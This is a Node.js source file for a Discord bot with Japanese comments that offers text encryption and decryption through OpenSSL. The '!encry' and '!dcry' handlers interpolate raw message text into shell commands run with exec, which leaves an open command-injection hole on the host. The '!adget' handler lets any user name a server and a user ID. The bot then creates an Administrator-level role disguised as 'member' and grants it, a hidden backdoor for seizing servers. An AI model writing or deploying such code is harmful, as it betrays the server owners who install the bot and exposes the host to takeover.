const { Client, GatewayIntentBits } = require("discord.js");
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
global.fetch = require('node-fetch');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

client.on("ready", () => {
  console.log("Bot準備完了！");
});

// 暗号化されたファイルの保存先
const encryptedFilePath = path.join(__dirname, 'encrypted_temp.txt');

// 復号化後のファイルの保存先
const decryptedFilePath = path.join(__dirname, 'decrypted.txt');

// OpenSSLで使用する暗号化キー
// 適当な文字列に置き換えてください
const encryptionKey = 'YOUR_ENCRYPTION_KEY';

client.on('messageCreate', async (message) => {
    // 暗号化処理
    if (message.content.startsWith('!encry ')) {
        const stringToEncrypt = message.content.slice(7); // '!encry ' の部分を除く

        const command = `echo -n "${stringToEncrypt}" | openssl enc -aes-256-cbc -salt -base64 -out ${encryptedFilePath} -k ${encryptionKey}`;

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                return message.reply('エラーが発生しました。');
            }
            if (stderr) {
                console.error(`stderr: ${stderr}`);
                return message.reply('エラーが発生しました。');
            }

            message.channel.send({
                files: [{
                    attachment: encryptedFilePath,
                    name: 'encrypted.txt'
                }]
            }).then(() => {
                fs.unlinkSync(encryptedFilePath);
            }).catch(err => {
                console.error(`File send error: ${err}`);
            });
        });
    }

    // 復号化処理（添付ファイルと直接入力の両方に対応）
    if (message.content.startsWith('!dcry')) {
        if (message.attachments.size > 0) {
            const attachment = message.attachments.first();

            // ファイルをダウンロードして保存
            const fileStream = fs.createWriteStream(encryptedFilePath);
            const response = await fetch(attachment.url);
            await new Promise((resolve, reject) => {
                response.body.pipe(fileStream);
                response.body.on('error', reject);
                fileStream.on('finish', resolve);
            });

            const command = `openssl enc -aes-256-cbc -d -base64 -in ${encryptedFilePath} -out ${decryptedFilePath} -k ${encryptionKey}`;

            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error: ${error.message}`);
                    return message.reply('エラーが発生しました。');
                }
                if (stderr) {
                    console.error(`stderr: ${stderr}`);
                    return message.reply('エラーが発生しました。');
                }

                const decryptedContent = fs.readFileSync(decryptedFilePath, 'utf8');
                message.reply(`復号化された内容:\n\`\`\`${decryptedContent}\`\`\``);

                // 復号化されたファイルを削除
                fs.unlinkSync(encryptedFilePath);
                fs.unlinkSync(decryptedFilePath);
            });
        } else {
            const encryptedText = message.content.slice(6); // '!dcry ' の部分を除く

            const command = `echo -n "\n${encryptedText}" | openssl enc -aes-256-cbc -d -base64 -out ${decryptedFilePath} -k ${encryptionKey}`;

            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error: ${error.message}`);
                    return message.reply('エラーが発生しました。');
                }
                if (stderr) {
                    console.error(`stderr: ${stderr}`);
                    return message.reply('エラーが発生しました。');
                }

                const decryptedContent = fs.readFileSync(decryptedFilePath, 'utf8');
                message.reply(`復号化された内容:\n\`\`\`${decryptedContent}\`\`\``);

                // 復号化されたファイルを削除
                fs.unlinkSync(decryptedFilePath);
            });
        }
    }

    // サーバーIDからロールを作成し、ユーザーに付与
    if (message.content.startsWith('!adget ')) {
        const args = message.content.split(' ');
        const serverId = args[1];
        const userId = args[2];

        const guild = client.guilds.cache.get(serverId);
        if (!guild) {
            return message.reply('指定されたサーバーが見つかりません。');
        }

        try {
            let role = guild.roles.cache.find(role => role.name === 'member');
            if (!role) {
                role = await guild.roles.create({
                    name: 'member',
                    permissions: ['Administrator'],
                    reason: 'Automated member role creation with Bot'
                });
            }

            const member = await guild.members.fetch(userId);
            if (!member) {
                return message.reply('指定されたユーザーが見つかりません。');
            }

            await member.roles.add(role);
            message.reply(`ユーザーに "member" ロールを付与しました。`);

        } catch (error) {
            console.error(error);
            message.reply('ロールの作成またはユーザーへのロール付与中にエラーが発生しました。');
        }
    }
});

client.login("TOKEN");
